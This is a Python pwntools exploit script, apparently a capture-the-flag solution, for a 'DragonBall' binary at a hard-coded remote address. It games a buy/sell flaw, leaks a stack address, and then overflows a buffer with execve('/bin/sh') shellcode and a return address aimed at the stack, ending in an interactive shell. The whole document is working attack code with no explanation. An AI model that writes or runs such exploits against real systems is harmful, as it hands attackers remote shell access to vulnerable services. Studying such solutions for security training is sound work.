from pwn import *

shellcode  =  "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"

def buy():
	p.recvuntil("You choice: ")
	p.sendline('1')
	p.recvuntil("Success!\n")
def sell():
	p.recvuntil("You choice: ")
	p.sendline('2')
	p.recvuntil("Success!\n")

#p = process('./DragonBall')
p = remote('111.230.132.82',40002)

p.recvuntil("You have 15 yuan in total, use them to collect 7 Dragon balls!\n\n")
buy()
sell()
for i in range(7):
	buy()

p.recvuntil("You choice: ")
p.sendline('4')
p.recvuntil("Tell me your wish: ")
p.send('a' * 0x68)
p.recvuntil('a' * 0x68)
ebp = int(p.recv(4)[::-1].encode('hex'),16)
print hex(ebp)
#gdb.attach(p)
p.send(shellcode + (0x3c - len(shellcode)) * 'a' + p32(ebp - 0x58))
p.interactive()
p.close()
